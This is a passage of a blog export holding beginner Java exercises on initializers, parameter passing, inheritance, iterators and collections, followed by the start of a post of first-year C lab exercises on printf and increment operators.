World!\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"InstanceInitializer\"><a href=\"#InstanceInitializer\" class=\"headerlink\" title=\"InstanceInitializer\"></a>InstanceInitializer</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">InstanceInitializer</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    Comp c1=<span class=\"keyword\">new</span> Comp(<span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">InstanceInitializer</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Instance Initielizer\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    Comp c2;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        InstanceInitializer ii=<span class=\"keyword\">new</span> InstanceInitializer();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    Comp c3=<span class=\"keyword\">new</span> Comp(<span class=\"number\">3</span>);</span><br><span class=\"line\">    &#123;<span class=\"comment\">//实例初始化程序块</span></span><br><span class=\"line\">        c2=<span class=\"keyword\">new</span> Comp(<span class=\"number\">2</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Comp</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">Comp</span><span class=\"params\">(<span class=\"keyword\">int</span> i)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Comp(\"</span>+i+<span class=\"string\">\")\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ParameterPass\"><a href=\"#ParameterPass\" class=\"headerlink\" title=\"ParameterPass\"></a>ParameterPass</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ParameterPass</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span>  <span class=\"keyword\">void</span> <span class=\"title\">passValue</span><span class=\"params\">(<span class=\"keyword\">int</span> v)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        v=<span class=\"number\">3</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">passObject1</span><span class=\"params\">(Circle c)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        c=<span class=\"keyword\">new</span> Circle(<span class=\"number\">3.0</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">passObject2</span><span class=\"params\">(Circle c)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        c.setRadius(<span class=\"number\">3.0</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">passArray1</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        a=<span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[<span class=\"number\">4</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">passArray2</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        a[a.length-<span class=\"number\">1</span>]=<span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">printArray</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i:a)</span><br><span class=\"line\">            System.out.println(i+<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">        System.out.println();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        ParameterPass pp=<span class=\"keyword\">new</span> ParameterPass();</span><br><span class=\"line\">        <span class=\"keyword\">int</span> i=<span class=\"number\">4</span>;</span><br><span class=\"line\">        pp.passValue(i);<span class=\"comment\">//传值，不会改变i的内容</span></span><br><span class=\"line\">        System.out.println(i);</span><br><span class=\"line\"></span><br><span class=\"line\">        Circle circ=<span class=\"keyword\">new</span> Circle(<span class=\"number\">4.0</span>);</span><br><span class=\"line\">        pp.passObject1(circ);</span><br><span class=\"line\">        System.out.println(circ.getRadius());</span><br><span class=\"line\">        pp.passObject2(circ);</span><br><span class=\"line\">        System.out.println(circ.getRadius());</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">int</span>[] array=<span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[]&#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>&#125;;</span><br><span class=\"line\">        pp.passArray1(array);</span><br><span class=\"line\">        pp.printArray(array);</span><br><span class=\"line\"></span><br><span class=\"line\">        pp.passArray2(array);</span><br><span class=\"line\">        pp.printArray(array);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Circle</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">double</span> radius;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">Circle</span><span class=\"params\">(<span class=\"keyword\">double</span> r)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        radius=r;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">setRadius</span><span class=\"params\">(<span class=\"keyword\">double</span> r)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        radius=r;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">double</span> <span class=\"title\">getRadius</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> radius;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Rectangle\"><a href=\"#Rectangle\" class=\"headerlink\" title=\"Rectangle\"></a>Rectangle</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Rectangle</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> width=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> height=<span class=\"number\">0</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">boolean</span> <span class=\"title\">setwidth</span><span class=\"params\">(<span class=\"keyword\">int</span> w)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(w&gt;<span class=\"number\">0</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            width=w;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">boolean</span> <span class=\"title\">setHeight</span><span class=\"params\">(<span class=\"keyword\">int</span> h)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(h&gt;<span class=\"number\">0</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            height=h;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">getWidth</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> width;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">getHeight</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> height;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">getArea</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> width*height;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">getPerimeter</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">2</span>*(width+height);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[]  args)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        Rectangle rect=<span class=\"keyword\">new</span> Rectangle();</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(rect.setwidth(<span class=\"number\">3</span>)&amp;&amp;rect.setHeight(<span class=\"number\">2</span>))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            System.out.println(rect.width+<span class=\"string\">\";\"</span>+rect.height);</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"Area of Rectangle:\"</span>+rect.getArea());</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"Perimeter of Rectangle:\"</span>+rect.getPerimeter());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Rectangle2\"><a href=\"#Rectangle2\" class=\"headerlink\" title=\"Rectangle2\"></a>Rectangle2</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Rectangle2</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> witdth=<span class=\"number\">3</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> height=<span class=\"number\">2</span>;</span><br><span class=\"line\">    Point pos;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">Rectangle2</span><span class=\"params\">(<span class=\"keyword\">int</span> w, <span class=\"keyword\">int</span> h,<span class=\"keyword\">int</span> x,<span class=\"keyword\">int</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        witdth=w;</span><br><span class=\"line\">        height=h;</span><br><span class=\"line\">        pos=<span class=\"keyword\">new</span> Point(x,y);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        Rectangle2 rect=<span class=\"keyword\">new</span> Rectangle2(<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Point</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> x;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> y;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">Point</span><span class=\"params\">(<span class=\"keyword\">int</span> x,<span class=\"keyword\">int</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.x=x;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.y=y;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ShiftRight\"><a href=\"#ShiftRight\" class=\"headerlink\" title=\"ShiftRight\"></a>ShiftRight</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ShiftRight</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        System.out.println(Integer.toBinaryString(-<span class=\"number\">12</span>));<span class=\"comment\">//0xfffffff4</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">int</span> i=-<span class=\"number\">12</span>;</span><br><span class=\"line\">        System.out.println(Integer.toBinaryString(i&gt;&gt;<span class=\"number\">2</span>));<span class=\"comment\">//带符号右移</span></span><br><span class=\"line\">        System.out.println(Integer.toBinaryString(i&gt;&gt;&gt;<span class=\"number\">2</span>));<span class=\"comment\">//无符号右移</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">byte</span> b=-<span class=\"number\">12</span>;</span><br><span class=\"line\">        System.out.println(Integer.toBinaryString(b&gt;&gt;<span class=\"number\">2</span>));<span class=\"comment\">//首先byte转换为int，然后带符号右移</span></span><br><span class=\"line\">        System.out.println(Integer.toBinaryString(b&gt;&gt;&gt;<span class=\"number\">2</span>));<span class=\"comment\">//首先byte转换为int，然后无符号右移</span></span><br><span class=\"line\"></span><br><span class=\"line\">        System.out.println(Integer.toBinaryString(b&gt;&gt;<span class=\"number\">2L</span>));<span class=\"comment\">//byte转换为int，而不会转换为long</span></span><br><span class=\"line\">        System.out.println(Long.toBinaryString(-<span class=\"number\">12L</span>&gt;&gt;<span class=\"number\">2L</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"TestInheritance\"><a href=\"#TestInheritance\" class=\"headerlink\" title=\"TestInheritance\"></a>TestInheritance</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestInheritance</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        Rectangle rect=<span class=\"keyword\">new</span> Rectangle();</span><br><span class=\"line\">        rect.newDraw();</span><br><span class=\"line\">        Circle circ=<span class=\"keyword\">new</span> Circle();</span><br><span class=\"line\">        circ.newDraw();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Shape</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">draw</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Draw shape\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Rectangle</span> <span class=\"keyword\">extends</span> <span class=\"title\">Shape</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">draw</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Draw Rectangle\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">newDraw</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        draw();</span><br><span class=\"line\">        <span class=\"keyword\">super</span>.draw();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Circle</span> <span class=\"keyword\">extends</span> <span class=\"title\">Shape</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">newDraw</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        draw();</span><br><span class=\"line\">        <span class=\"keyword\">super</span>.draw();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"TestIterator\"><a href=\"#TestIterator\" class=\"headerlink\" title=\"TestIterator\"></a>TestIterator</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.util.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestIterator</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String args[])</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        String sentence=<span class=\"string\">\"The day you went away!\"</span>;</span><br><span class=\"line\">        String[] strs=sentence.split(<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">        List&lt;String&gt; list=<span class=\"keyword\">new</span> ArrayList&lt;String&gt;(Arrays.asList(strs));</span><br><span class=\"line\">        Iterator&lt;String&gt; it=list.iterator();</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(it.hasNext())</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            System.out.print(it.next()+<span class=\"string\">\"_\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        System.out.println();</span><br><span class=\"line\"></span><br><span class=\"line\">        it=list.iterator();</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(it.hasNext())</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(it.next().equals(<span class=\"string\">\"you\"</span>))</span><br><span class=\"line\">                it.remove();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        it=list.iterator();</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(it.hasNext())</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            System.out.print(it.next()+<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        System.out.println();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"TestOverloading\"><a href=\"#TestOverloading\" class=\"headerlink\" title=\"TestOverloading\"></a>TestOverloading</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestOverloading</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"keyword\">false</span>);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">'C'</span>);</span><br><span class=\"line\">        System.out.println(<span class=\"number\">123</span>);</span><br><span class=\"line\">        System.out.println(<span class=\"number\">132L</span>);</span><br><span class=\"line\">        System.out.println(<span class=\"number\">12.3f</span>);</span><br><span class=\"line\">        System.out.println(<span class=\"number\">12.3</span>);</span><br><span class=\"line\">        System.out.println();</span><br><span class=\"line\">        <span class=\"keyword\">char</span>[] cc=&#123;<span class=\"string\">'a'</span>,<span class=\"string\">'b'</span>,<span class=\"string\">'c'</span>&#125;;</span><br><span class=\"line\">        System.out.println(cc);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"abc\"</span>);</span><br><span class=\"line\">        System.out.println(<span class=\"keyword\">new</span> java.util.Date());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"TestSet\"><a href=\"#TestSet\" class=\"headerlink\" title=\"TestSet\"></a>TestSet</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.util.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestSet</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String args[])</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        Random rand=<span class=\"keyword\">new</span> Random(<span class=\"number\">47</span>);</span><br><span class=\"line\">        Set&lt;Integer&gt; s=<span class=\"keyword\">new</span> HashSet&lt;Integer&gt;();</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">5000</span>;i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            s.add(rand.nextInt(<span class=\"number\">40</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        System.out.println(s);</span><br><span class=\"line\"></span><br><span class=\"line\">        s=<span class=\"keyword\">new</span> TreeSet&lt;Integer&gt;();</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">5000</span>;i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            s.add(rand.nextInt(<span class=\"number\">40</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        System.out.println(s);</span><br><span class=\"line\"></span><br><span class=\"line\">        s=<span class=\"keyword\">new</span> LinkedHashSet();</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">5000</span>;i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            s.add(rand.nextInt(<span class=\"number\">40</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        System.out.println(s);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","categories":["技术"],"tags":["java"]},{"title":"C语言上机作业","url":"https://littleghost2016.github.io/2016/01/03/C语言上机作业/","content":"<h1 id=\"C语言上机作业\"><a href=\"#C语言上机作业\" class=\"headerlink\" title=\"C语言上机作业\"></a>C语言上机作业</h1><p>整理一下大一上时的练习，当时用的还是<code>ThinkPad L410</code>+<code>XP</code>+<code>VC++6.0</code>，那时的自己还能一边食堂吃午饭一边手机看汇编学习的视频，有点怀念QAQ</p>\n<h1 id=\"printf的使用\"><a href=\"#printf的使用\" class=\"headerlink\" title=\"printf的使用\"></a>printf的使用</h1><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// It's the first class in college</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Hello World.\\n\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 第一次stdio.h打错了</span></span><br><span class=\"line\"><span class=\"comment\">// 知道还有”math.h””string.h”</span></span><br><span class=\"line\"><span class=\"comment\">// #include 表示引用头文件</span></span><br><span class=\"line\"><span class=\"comment\">// 如”stdio.h”中包括标准的输入输出函数</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"printf的使用2\"><a href=\"#printf的使用2\" class=\"headerlink\" title=\"printf的使用2\"></a>printf的使用2</h1><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> number;</span><br><span class=\"line\">  <span class=\"keyword\">float</span> amount;</span><br><span class=\"line\">  number=<span class=\"number\">100</span>;</span><br><span class=\"line\">  amount=<span class=\"number\">30.75</span>+<span class=\"number\">70.35</span>;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>,number);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"%5.2f\"</span>,amount);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"理解i-和-i\"><a href=\"#理解i-和-i\" class=\"headerlink\" title=\"理解i++和++i\"></a>理解i++和++i</h1><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> x,y;</span><br><span class=\"line\">  x=<span class=\"number\">10</span>;</span><br><span class=\"line\">  y=++x;</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span 